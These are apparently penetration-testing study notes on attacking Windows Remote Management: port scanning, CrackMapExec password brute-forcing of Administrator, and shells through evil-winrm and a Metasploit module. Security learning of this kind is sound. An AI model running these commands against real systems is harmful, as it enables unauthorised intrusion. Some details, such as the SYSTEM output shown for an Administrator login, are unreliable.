# Is WinRM the SSH of Windows?

**Yes â€” essentially.**  

WinRM (Windows Remote Management) is **Microsoftâ€™s native, scriptable remote shell protocol**, equivalent to SSH on Linux.

- Runs over **HTTP (5985)** or **HTTPS (5986)**
- Uses **PowerShell** as the backend
- Designed for **remote administration**, automation, and management

> âœ… Think: **SSH = Linux CLI remote access** | **WinRM = Windows PowerShell remote access**

---
## Exploiting WinRM â€“ Workflow

### 1. **Discover WinRM Port**

WinRM is **not in Nmapâ€™s top 1000 ports** â†’ scan explicitly:
```bash
nmap -p 5985,5986 192.168.1.10
# OR full scan:
nmap -p- 192.168.1.10
```
> ðŸ’¡ Service may show as `http` or `unknown` â€” but **port 5985/5986 = WinRM**.

---
### 2. **Brute-Force with CrackMapExec (CME)**

CME supports multiple protocols â€” including **winrm**:
```bash
crackmapexec winrm 192.168.1.10 -u Administrator -p /wordlists/passwords.txt
```

> â“ **Why only `-u Administrator` (no userlist)?**  
> - The **Administrator account** is **always present** on Windows (RID 500)  
> - Often used for remote management â†’ high-value target

âœ… Success: `[+] PWN3D!`

#### Execute Commands
```bash
cme winrm 192.168.1.10 -u Administrator -p tinkerbell -x "whoami"
cme winrm 192.168.1.10 -u Administrator -p tinkerbell -x "ipconfig"
```

---
### 3. **Get Interactive Shell: `evil-winrm`**

```bash
evil-winrm -u Administrator -p 'tinkerbell' -i 192.168.1.10
```

â†’ Drops you into a **PowerShell session** on the target:
```powershell
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
nt authority\system
```

> ðŸ”¥ Full PowerShell = **file ops, registry edits, lateral movement**, etc.

---
### 4. **Alternative: Metasploit Module**

```msf
search winrm_script_exec
use exploit/windows/winrm/winrm_script_exec
set RHOSTS 192.168.1.10
set USERNAME Administrator
set PASSWORD tinkerbell
set FORCE_VBS true   # â† What does this mean?
exploit
```

> â“ **`FORCE_VBS = true`?**  
> - By default, MSF uses **PowerShell** to deliver Meterpreter  
> - If PowerShell is **blocked**, it falls back to **VBScript (`wscript`)**  
> - `FORCE_VBS` skips PowerShell â†’ uses VBScript stager (less reliable, but bypasses AppLocker)

âœ… Result: **Meterpreter session** (`getuid`, `sysinfo`, etc.)

